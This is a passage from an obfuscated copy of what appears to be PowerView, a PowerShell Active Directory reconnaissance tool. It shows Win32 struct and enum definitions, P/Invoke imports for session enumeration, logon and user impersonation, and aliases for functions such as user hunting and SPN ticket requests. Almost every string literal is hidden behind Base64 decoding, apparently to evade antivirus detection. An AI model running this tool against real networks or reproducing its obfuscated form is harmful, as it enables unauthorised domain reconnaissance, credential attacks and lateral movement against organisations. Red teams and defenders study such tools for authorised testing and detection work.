            $GpoACL | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $gpo.Properties.displayname
            $GpoACL | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2U="))) $ACL.IdentityReference
            $GpoACL | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWN0aXZlRGlyZWN0b3J5UmlnaHRz"))) $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}











$Mod = New-InMemoryModule -ModuleName Win32




$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMA==")))
    GROUP_OBJECT                    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxMDAwMDAwMA==")))
    NON_SECURITY_GROUP_OBJECT       =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxMDAwMDAwMQ==")))
    ALIAS_OBJECT                    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgyMDAwMDAwMA==")))
    NON_SECURITY_ALIAS_OBJECT       =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgyMDAwMDAwMQ==")))
    USER_OBJECT                     =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgzMDAwMDAwMA==")))
    MACHINE_ACCOUNT                 =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgzMDAwMDAwMQ==")))
    TRUST_ACCOUNT                   =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgzMDAwMDAwMg==")))
    APP_BASIC_GROUP                 =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg0MDAwMDAwMA==")))
    APP_QUERY_GROUP                 =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg0MDAwMDAwMQ==")))
    ACCOUNT_TYPE_MAX                =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg3ZmZmZmZmZg==")))
}


$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMQ==")))
    GLOBAL_SCOPE                    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMg==")))
    DOMAIN_LOCAL_SCOPE              =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwNA==")))
    UNIVERSAL_SCOPE                 =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwOA==")))
    APP_BASIC                       =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAxMA==")))
    APP_QUERY                       =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAyMA==")))
    SECURITY                        =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg4MDAwMDAwMA==")))
} -Bitfield


$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield


$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    pHostName = field 4 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    pUserName = field 5 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    pDomainName = field 6 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    pFarmName = field 7 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
}


$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QnlWYWxBcnJheQ=="))), 20)
}


$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
}


$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    LogonDomain = field 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    AuthDomains = field 2 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    LogonServer = field 3 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
}


$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    UserName = field 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}


$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}


$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    lgrpi1_comment = field 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
}


$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
}


$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}


$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    DnsDomainName = field 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}


$NETRESOURCEW = struct $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    lpRemoteName =    field 5 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    lpComment =       field 6 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    lpProvider =      field 7 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
}


$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzI=")))
$Netapi32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmV0YXBpMzI=")))]
$Advapi32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWR2YXBpMzI=")))]
$Wtsapi32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d3RzYXBpMzI=")))]
$Mpr = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TXBy")))]
$Kernel32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzI=")))]

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData